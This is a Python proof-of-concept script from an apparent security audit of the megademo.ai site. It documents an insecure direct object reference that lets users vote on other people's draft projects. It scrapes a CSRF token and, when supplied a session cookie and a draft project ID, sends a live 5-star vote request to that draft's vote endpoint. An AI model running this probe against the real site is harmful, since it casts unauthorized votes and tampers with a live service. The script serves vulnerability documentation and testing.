#!/usr/bin/env python3
"""Document the draft-project voting IDOR and optionally probe a known draft project ID."""
import os
import re
import sys
from pathlib import Path

import requests

BASE_URL = os.environ.get('MEGADEMO_BASE_URL', 'https://megademo.ai')
DEFAULT_COOKIE = 'connect.sid=YOUR_SESSION_COOKIE_HERE'
COOKIE = os.environ.get('MEGADEMO_COOKIE', DEFAULT_COOKIE)
README = Path(__file__).resolve().parents[1] / 'README.md'
TITLE = 'IDOR Voting on Draft Projects'


def find_refs():
    refs = []
    if README.exists():
        for number, line in enumerate(README.read_text().splitlines(), start=1):
            if TITLE in line or ('draft projects' in line and 'vote' in line):
                refs.append((number, line.strip()))
    return refs


def main():
    session = requests.Session()
    session.headers.update({'User-Agent': 'megademo-security-audit-poc/1.0', 'Cookie': COOKIE})
    browse = session.get(f'{BASE_URL}/projects', allow_redirects=False, timeout=20)
    csrf_match = re.search(r'meta name="csrf-token" content="([^"]+)"', browse.text)
    csrf = os.environ.get('MEGADEMO_CSRF') or (csrf_match.group(1) if csrf_match else None)
    draft_id = os.environ.get('MEGADEMO_DRAFT_PROJECT_ID')

    print(f'GET /projects -> {browse.status_code}')
    print(f'CSRF token discovered: {"yes" if csrf else "no"}')

    if draft_id and csrf:
        response = session.post(
            f'{BASE_URL}/projects/{draft_id}/vote',
            data={'stars': '5'},
            headers={'x-csrf-token': csrf},
            timeout=20,
        )
        print(f'POST /projects/{draft_id}/vote -> {response.status_code}')
        print(response.text[:300])
    else:
        print('Live probe skipped: set MEGADEMO_DRAFT_PROJECT_ID and MEGADEMO_CSRF to test a specific draft project.')

    refs = find_refs()
    print()
    print('Local audit references:')
    for number, line in refs[:5]:
        print(f'  README.md:{number}: {line}')

    if refs:
        print()
        print('NOTE: this finding is primarily source-review backed; a live confirmation requires a known draft project ID.')
        return 0

    print()
    print('NOT CONFIRMED: local audit references were not found.')
    return 1


if __name__ == '__main__':
    sys.exit(main())
